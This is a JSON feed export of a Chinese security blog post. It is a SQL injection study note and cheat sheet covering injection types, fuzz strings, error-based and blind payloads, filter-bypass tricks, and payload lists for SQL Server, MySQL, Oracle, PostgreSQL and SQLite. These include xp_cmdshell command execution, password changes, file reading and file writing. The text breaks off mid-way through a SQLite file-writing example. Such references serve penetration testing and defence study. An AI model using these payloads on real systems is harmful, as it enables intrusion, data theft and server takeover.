{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"sql注入\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "title": "SQL注入",
            "date_published": "2022-11-26T03:05:09.000Z",
            "content_html": "<h1 id=\"注入分类\"><a class=\"anchor\" href=\"#注入分类\">#</a> 注入分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>\n<h2 id=\"按技巧分类\"><a class=\"anchor\" href=\"#按技巧分类\">#</a> 按技巧分类</h2>\n<p>根据使用的技巧，SQL 注入类型可分为</p>\n<ul>\n<li>\n<p>盲注</p>\n<ul>\n<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>\n<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>\n</ul>\n</li>\n<li>\n<p>报错注入：应用会显示全部或者部分的报错信息</p>\n</li>\n<li>\n<p>堆叠注入：有的应用可以加入  <code>;</code>  后一次执行多条语句</p>\n</li>\n<li>\n<p>其他</p>\n</li>\n</ul>\n<h2 id=\"按获取数据的方式分类\"><a class=\"anchor\" href=\"#按获取数据的方式分类\">#</a> 按获取数据的方式分类</h2>\n<p>另外也可以根据获取数据的方式分为 3 类</p>\n<h3 id=\"inband\"><a class=\"anchor\" href=\"#inband\">#</a> inband</h3>\n<p>利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>\n<h3 id=\"inference\"><a class=\"anchor\" href=\"#inference\">#</a> inference</h3>\n<p>通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。</p>\n<h3 id=\"out-of-band-oob\"><a class=\"anchor\" href=\"#out-of-band-oob\">#</a> out of band (OOB)</h3>\n<p>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。</p>\n<h1 id=\"注入检测\"><a class=\"anchor\" href=\"#注入检测\">#</a> 注入检测</h1>\n<h2 id=\"常见的注入点\"><a class=\"anchor\" href=\"#常见的注入点\">#</a> 常见的注入点</h2>\n<ul>\n<li>GET/POST/PUT/DELETE 参数</li>\n<li>X-Forwarded-For</li>\n<li>文件名</li>\n</ul>\n<h2 id=\"fuzz注入点\"><a class=\"anchor\" href=\"#fuzz注入点\">#</a> Fuzz 注入点</h2>\n<ul>\n<li><code>'</code>  /  <code>&quot;</code></li>\n<li><code>1/1</code></li>\n<li><code>1/0</code></li>\n<li><code>and 1=1</code></li>\n<li><code>&quot; and &quot;1&quot;=&quot;1</code></li>\n<li><code>and 1=2</code></li>\n<li><code>or 1=1</code></li>\n<li><code>or 1=</code></li>\n<li><code>' and '1'='1</code></li>\n<li><code>+</code>   <code>-</code>   <code>^</code>   <code>*</code>   <code>%</code>   <code>/</code></li>\n<li><code>&lt;&lt;</code>   <code>&gt;&gt;</code>   <code>||</code>   <code>|</code>   <code>&amp;</code>   <code>&amp;&amp;</code></li>\n<li><code>~</code></li>\n<li><code>!</code></li>\n<li><code>@</code></li>\n<li>反引号执行</li>\n</ul>\n<h2 id=\"测试用常量\"><a class=\"anchor\" href=\"#测试用常量\">#</a> 测试用常量</h2>\n<ul>\n<li><code>@@version</code></li>\n<li><code>@@servername</code></li>\n<li><code>@@language</code></li>\n<li><code>@@spid</code></li>\n</ul>\n<h2 id=\"测试列数\"><a class=\"anchor\" href=\"#测试列数\">#</a> 测试列数</h2>\n<p>例如  <code>http://www.foo.com/index.asp?id=12+union+select+null,null--</code>  ，不断增加  <code>null</code>  至不返回</p>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<ul>\n<li><code>select 1/0</code></li>\n<li><code>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a</code></li>\n<li><code>extractvalue(1, concat(0x5c,(select user())))</code></li>\n<li><code>updatexml(0x3a,concat(1,(select user())),1)</code></li>\n<li><code>exp(~(SELECT * from(select user())a))</code></li>\n<li><code>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</code></li>\n<li><code>GTID_SUBSET(version(), 1)</code></li>\n</ul>\n<h3 id=\"基于geometric的报错注入\"><a class=\"anchor\" href=\"#基于geometric的报错注入\">#</a> 基于 geometric 的报错注入</h3>\n<ul>\n<li><code>GeometryCollection((select * from (select * from(select user())a)b))</code></li>\n<li><code>polygon((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipoint((select * from(select * from(select user())a)b))</code></li>\n<li><code>multilinestring((select * from(select * from(select user())a)b))</code></li>\n<li><code>LINESTRING((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipolygon((select * from(select * from(select user())a)b))</code></li>\n</ul>\n<p>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==\">commit 95825f</span> 。</p>\n<p>而以上列表中基于 geometric 的报错注入在这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==\">commit 5caea4</span> 中被修复，在 5.5.x 较后的版本中同样不再生效。</p>\n<h2 id=\"堆叠注入\"><a class=\"anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h2>\n<ul>\n<li><code>;select 1</code></li>\n</ul>\n<h2 id=\"注释符\"><a class=\"anchor\" href=\"#注释符\">#</a> 注释符</h2>\n<ul>\n<li><code>#</code></li>\n<li><code>--+</code></li>\n<li><code>/*xxx*/</code></li>\n<li><code>/*!xxx*/</code></li>\n<li><code>/*!50000xxx*/</code></li>\n</ul>\n<h2 id=\"判断过滤规则\"><a class=\"anchor\" href=\"#判断过滤规则\">#</a> 判断过滤规则</h2>\n<ul>\n<li>是否有 trunc</li>\n<li>是否过滤某个字符</li>\n<li>是否过滤关键字</li>\n<li>slash 和编码</li>\n</ul>\n<h2 id=\"获取信息\"><a class=\"anchor\" href=\"#获取信息\">#</a> 获取信息</h2>\n<ul>\n<li>\n<p>判断数据库类型</p>\n<ul>\n<li><code>and exists (select * from msysobjects ) &gt; 0</code>  access 数据库</li>\n<li><code>and exists (select * from sysobjects ) &gt; 0</code>  SQLServer 数据库</li>\n</ul>\n</li>\n<li>\n<p>判断数据库表</p>\n<ul>\n<li><code>and exsits (select * from admin)</code></li>\n</ul>\n</li>\n<li>\n<p>版本、主机名、用户名、库名</p>\n</li>\n<li>\n<p>表和字段</p>\n<ul>\n<li>\n<p>确定字段数</p>\n<ul>\n<li>\n<p>Order By</p>\n</li>\n<li>\n<p>Select Into</p>\n</li>\n</ul>\n</li>\n<li>\n<p>表名、列名</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"测试权限\"><a class=\"anchor\" href=\"#测试权限\">#</a> 测试权限</h2>\n<ul>\n<li>文件操作\n<ul>\n<li>读敏感文件</li>\n<li>写 shell</li>\n</ul>\n</li>\n<li>带外通道\n<ul>\n<li>网络请求</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h1>\n<h2 id=\"udf提权\"><a class=\"anchor\" href=\"#udf提权\">#</a> UDF 提权</h2>\n<p>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。</p>\n<p>当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</p>\n<h1 id=\"数据库检测\"><a class=\"anchor\" href=\"#数据库检测\">#</a> 数据库检测</h1>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> MySQL</h2>\n<ul>\n<li>sleep  <code>sleep(1)</code></li>\n<li>benchmark  <code>BENCHMARK(5000000, MD5('test'))</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'a' 'b'</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>识别用函数\n<ul>\n<li><code>connection_id()</code></li>\n<li><code>last_insert_id()</code></li>\n<li><code>row_count()</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle\"><a class=\"anchor\" href=\"#oracle\">#</a> Oracle</h2>\n<ul>\n<li>字符串连接\n<ul>\n<li><code>'a'||'oracle' --</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT banner FROM v$version</code></li>\n<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"sqlserver\"><a class=\"anchor\" href=\"#sqlserver\">#</a> SQLServer</h2>\n<ul>\n<li>WAITFOR  <code>WAITFOR DELAY '00:00:10';</code></li>\n<li>SERVERNAME  <code>SELECT @@SERVERNAME</code></li>\n<li>version  <code>SELECT @@version</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'some'+'string'</code></li>\n</ul>\n</li>\n<li>常量\n<ul>\n<li><code>@@pack_received</code></li>\n<li><code>@@rowcount</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"postgresql\"><a class=\"anchor\" href=\"#postgresql\">#</a> PostgreSQL</h2>\n<ul>\n<li>sleep  <code>pg_sleep(1)</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<ul>\n<li>\n<p>编码绕过</p>\n<ul>\n<li>大小写</li>\n<li>url 编码</li>\n<li>html 编码</li>\n<li>十六进制编码</li>\n<li>unicode 编码</li>\n</ul>\n</li>\n<li>\n<p>注释</p>\n<ul>\n<li><code>//</code>   <code>--</code>   <code>-- +</code>   <code>-- -</code>   <code>#</code>   <code>/**/</code>   <code>;%00</code></li>\n<li>内联注释用的更多，它有一个特性  <code>/!**/</code>  只有 MySQL 能识别</li>\n<li>e.g.  <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>\n</ul>\n</li>\n<li>\n<p>只过滤了一次时</p>\n<ul>\n<li><code>union</code>  =&gt;  <code>ununionion</code></li>\n</ul>\n</li>\n<li>\n<p>相同功能替换</p>\n<ul>\n<li>函数替换\n<ul>\n<li><code>substring</code>  /  <code>mid</code>  /  <code>sub</code></li>\n<li><code>ascii</code>  /  <code>hex</code>  /  <code>bin</code></li>\n<li><code>benchmark</code>  /  <code>sleep</code></li>\n</ul>\n</li>\n<li>变量替换\n<ul>\n<li><code>user()</code>  /  <code>@@user</code></li>\n</ul>\n</li>\n<li>符号和关键字\n<ul>\n<li><code>and</code>  / `&amp;``</li>\n<li><code>or</code>  /  <code>|</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>HTTP 参数</p>\n<ul>\n<li>HTTP 参数污染\n<ul>\n<li><code>id=1&amp;id=2&amp;id=3</code>  根据容器不同会有不同的结果</li>\n</ul>\n</li>\n<li>HTTP 分割注入</li>\n</ul>\n</li>\n<li>\n<p>缓冲区溢出</p>\n<ul>\n<li>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</li>\n</ul>\n</li>\n<li>\n<p>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</p>\n</li>\n</ul>\n<h1 id=\"sql注入小技巧\"><a class=\"anchor\" href=\"#sql注入小技巧\">#</a> SQL 注入小技巧</h1>\n<h2 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p>一般程序员用 gbk 编码做开发的时候，会用  <code>set names 'gbk'</code>  来设定，这句话等同于</p>\n<pre><code>set\ncharacter_set_connection = 'gbk',\ncharacter_set_result = 'gbk',\ncharacter_set_client = 'gbk';\n</code></pre>\n<p>漏洞发生的原因是执行了  <code>set character_set_client = 'gbk';</code>  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  <code>set names 'gbk'</code>  的话 real_escape 是不知道设置的数据的编码的，就会加  <code>%5c</code>  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。</p>\n<p>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  <code>mysql_set_charset('gbk')</code>  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。</p>\n<p>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</p>\n<h1 id=\"cheatsheet\"><a class=\"anchor\" href=\"#cheatsheet\">#</a> CheatSheet</h1>\n<h2 id=\"sql-server-payload\"><a class=\"anchor\" href=\"#sql-server-payload\">#</a> SQL Server Payload</h2>\n<h3 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT SERVERPROPERTY('Edition');</code></li>\n<li><code>SELECT SERVERPROPERTY('EngineEdition');</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x01 - 0x20</code></li>\n</ul>\n</li>\n<li>\n<p>用户信息</p>\n<ul>\n<li><code>SELECT user_name()</code></li>\n<li>``SELECT system_user`</li>\n<li><code>SELECT user</code></li>\n<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code></li>\n</ul>\n</li>\n<li>\n<p>用户权限</p>\n<ul>\n<li><code>select IS_SRVROLEMEMBER('sysadmin')</code></li>\n<li><code>select IS_SRVROLEMEMBER('db_owner')</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<p><code>SELECT name FROM master..syslogins</code></p>\n</li>\n<li>\n<p>数据库信息</p>\n<ul>\n<li><code>SELECT name FROM master..sysdatabases</code></li>\n<li><code>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</code></li>\n<li><code>select quotename(name) from master..sysdatabases FOR XML PATH('')</code></li>\n</ul>\n</li>\n<li>\n<p>执行命令</p>\n<ul>\n<li><code>EXEC xp_cmdshell 'net user'</code></li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT char(65)+char(66)</code>  =&gt; return  <code>AB</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>WAITFOR DELAY '0:0:3'</code>  pause for 3 seconds</li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'</code></li>\n</ul>\n</li>\n<li>\n<p>Trick</p>\n<ul>\n<li><code>id=1 union:select password from:user</code></li>\n</ul>\n</li>\n<li>\n<p>文件读取</p>\n<ul>\n<li>OpenRowset</li>\n</ul>\n</li>\n<li>\n<p>当前查询语句</p>\n<ul>\n<li><code>select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</code></li>\n</ul>\n</li>\n<li>\n<p>hostname</p>\n<ul>\n<li>用于判断是否站库分离</li>\n<li><code>select host_name()</code></li>\n<li><code>exec xp_getnetname</code></li>\n</ul>\n</li>\n<li>\n<p>服务器信息</p>\n<ul>\n<li><code>exec xp_msver</code></li>\n</ul>\n</li>\n<li>\n<p>系统配置</p>\n<ul>\n<li><code>select * from sys.configurations;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"注册表读写\"><a class=\"anchor\" href=\"#注册表读写\">#</a> 注册表读写</h3>\n<ul>\n<li>\n<p><code>xp_regread</code></p>\n<ul>\n<li><code>exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'</code></li>\n</ul>\n</li>\n<li>\n<p><code>xp_regwrite</code></p>\n</li>\n<li>\n<p><code>xp_regdeletvalue</code></p>\n</li>\n<li>\n<p><code>xp_regdeletkey</code></p>\n</li>\n<li>\n<p><code>xp_regaddmultistring</code></p>\n</li>\n</ul>\n<h3 id=\"报错注入-2\"><a class=\"anchor\" href=\"#报错注入-2\">#</a> 报错注入</h3>\n<ul>\n<li><code>1=convert(int,(db_name()))</code></li>\n</ul>\n<h3 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h3>\n<ul>\n<li>SUSER_NAME()</li>\n<li>USER_NAME()</li>\n<li>PERMISSIONS()</li>\n<li>DB_NAME()</li>\n<li>FILE_NAME()</li>\n<li>TYPE_NAME()</li>\n<li>COL_NAME()</li>\n</ul>\n<h3 id=\"dns-oob\"><a class=\"anchor\" href=\"#dns-oob\">#</a> DNS OOB</h3>\n<ul>\n<li>fn_xe_file_target_read_file</li>\n<li>fn_get_audit_file</li>\n<li>fn_trace_gettable</li>\n</ul>\n<h3 id=\"其他常用存储过程\"><a class=\"anchor\" href=\"#其他常用存储过程\">#</a> 其他常用存储过程</h3>\n<ul>\n<li>sp_execute_external_script</li>\n<li>sp_makewebtask</li>\n<li>sp_OACreate</li>\n<li>sp_OADestroy</li>\n<li>sp_OAGetErrorInfo</li>\n<li>sp_OAGetProperty</li>\n<li>sp_OAMethod</li>\n<li>sp_OASetProperty</li>\n<li>sp_OAStop</li>\n<li>xp_cmdshell</li>\n<li>xp_dirtree</li>\n<li>xp_enumerrorlogs</li>\n<li>xp_enumgroups</li>\n<li>xp_fixeddrives</li>\n<li>xp_getfiledetails</li>\n<li>xp_loginconfig</li>\n</ul>\n<h2 id=\"mysql-payload\"><a class=\"anchor\" href=\"#mysql-payload\">#</a> MySQL Payload</h2>\n<h3 id=\"常见payload-2\"><a class=\"anchor\" href=\"#常见payload-2\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT 1 # comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x9</code>   <code>0xa-0xd</code>   <code>0x20</code>   <code>0xa0</code></li>\n</ul>\n</li>\n<li>\n<p>Current User</p>\n<ul>\n<li><code>SELECT user()</code></li>\n<li><code>SELECT system_user()</code></li>\n<li><code>SELECT current_role()</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<ul>\n<li><code>SELECT user FROM mysql.user</code></li>\n</ul>\n</li>\n<li>\n<p>Current Database</p>\n<ul>\n<li><code>SELECT database()</code></li>\n</ul>\n</li>\n<li>\n<p>List Database</p>\n<ul>\n<li><code>SELECT schema_name FROM information_schema.schemata</code></li>\n</ul>\n</li>\n<li>\n<p>List Tables</p>\n<ul>\n<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>List Columns</p>\n<ul>\n<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>If</p>\n<ul>\n<li><code>SELECT if(1=1,'foo','bar');</code>  return 'foo'</li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li>`SELECT char(0x41)</li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT 0x414243</code>  =&gt; return  <code>ABC</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>sleep(1)</code></li>\n<li><code>SELECT BENCHMARK(1000000,MD5('A'))</code></li>\n</ul>\n</li>\n<li>\n<p>Read File</p>\n<ul>\n<li><code>select @@datadir``select load_file('databasename/tablename.MYD')</code></li>\n</ul>\n</li>\n<li>\n<p>Blind</p>\n<ul>\n<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>\n</ul>\n</li>\n<li>\n<p>Error Based</p>\n<ul>\n<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>\n<li><code>select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))</code></li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"报错注入常见函数\"><a class=\"anchor\" href=\"#报错注入常见函数\">#</a> 报错注入常见函数</h4>\n<ul>\n<li>extractvalue</li>\n<li>updatexml</li>\n<li>GeometryCollection</li>\n<li>linestring</li>\n<li>multilinestring</li>\n<li>multipoint</li>\n<li>multipolygon</li>\n<li>polygon</li>\n<li>exp</li>\n</ul>\n<h3 id=\"写文件\"><a class=\"anchor\" href=\"#写文件\">#</a> 写文件</h3>\n<h4 id=\"写文件前提\"><a class=\"anchor\" href=\"#写文件前提\">#</a> 写文件前提</h4>\n<ul>\n<li>root 权限</li>\n<li>知晓文件绝对路径</li>\n<li>写入的路径存在写入权限</li>\n<li>secure_file_priv 允许向对应位置写入</li>\n<li><code>select count(file_priv) from mysql.user</code></li>\n</ul>\n<h4 id=\"基于into写文件\"><a class=\"anchor\" href=\"#基于into写文件\">#</a> 基于 into 写文件</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr></table></figure><p>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>\n<h4 id=\"基于log写文件\"><a class=\"anchor\" href=\"#基于log写文件\">#</a> 基于 log 写文件</h4>\n<pre><code>show variables like '%general%';\nset global general_log = on;\nset global general_log_file = '/path/to/file';\nselect '&lt;?php var_dump(&quot;test&quot;);?&gt;';\nset global general_log_file = '/original/path';\nset global general_log = off;\n</code></pre>\n<h2 id=\"postgressql-payload\"><a class=\"anchor\" href=\"#postgressql-payload\">#</a> PostgresSQL Payload</h2>\n<ul>\n<li>Version\n<ul>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>Comment\n<ul>\n<li><code>SELECT 1 -- comment``SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>Current User\n<ul>\n<li><code>SELECT user</code></li>\n<li><code>SELECT current_user</code></li>\n<li>``SELECT session_user`</li>\n<li><code>SELECT getpgusername()</code></li>\n</ul>\n</li>\n<li>List User\n<ul>\n<li><code>SELECT usename FROM pg_user</code></li>\n</ul>\n</li>\n<li>Current Database\n<ul>\n<li><code>SELECT current_database()</code></li>\n</ul>\n</li>\n<li>List Database\n<ul>\n<li><code>SELECT datname FROM pg_database</code></li>\n</ul>\n</li>\n<li>Ascii\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n</ul>\n</li>\n<li>Delay\n<ul>\n<li><code>pg_sleep(1)</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle-payload\"><a class=\"anchor\" href=\"#oracle-payload\">#</a> Oracle Payload</h2>\n<h3 id=\"常见payload-3\"><a class=\"anchor\" href=\"#常见payload-3\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<ul>\n<li>\n<p>dump</p>\n<p><code>select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = 'table_name';``select column_name, data_type from user_tab_columns where table_name = 'table_name';``SELECT * FROM ALL_TABLES</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Comment</p>\n<p><code>--``/**/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Space</p>\n<p><code>0x00</code>   <code>0x09</code>   <code>0xa-0xd</code>   <code>0x20</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>报错</p>\n<p><code>utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>OOB</p>\n<p><code>utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>绕过</p>\n<p><code>rawtohex</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"写文件-2\"><a class=\"anchor\" href=\"#写文件-2\">#</a> 写文件</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> directory TEST_DIR <span class=\"token keyword\">as</span> <span class=\"token string\">'/path/to/dir'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">read</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">write</span> <span class=\"token keyword\">on</span> directory TEST_DIR <span class=\"token keyword\">to</span> system<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   isto_file utl_file<span class=\"token punctuation\">.</span>file_type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">begin</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   isto_file :<span class=\"token operator\">=</span> utl_file<span class=\"token punctuation\">.</span>fopen<span class=\"token punctuation\">(</span><span class=\"token string\">'TEST_DIR'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test.jsp'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>put_line<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;% out.println(\"test\"); %>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fflush<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fclose<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"sqlite3-payload\"><a class=\"anchor\" href=\"#sqlite3-payload\">#</a> SQLite3 Payload</h2>\n<ul>\n<li>Comment\n<ul>\n<li><code>--</code></li>\n<li><code>/**/</code></li>\n</ul>\n</li>\n<li>Version\n<ul>\n<li><code>select sqlite_version();</code></li>\n</ul>\n</li>\n</ul>\n<p>Command Execution</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ATTACH <span class=\"token keyword\">DATABASE</span> <span class=\"token string\">'/var/www/lol.php'</span> <span class=\"token keyword\">AS</span> lol<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token 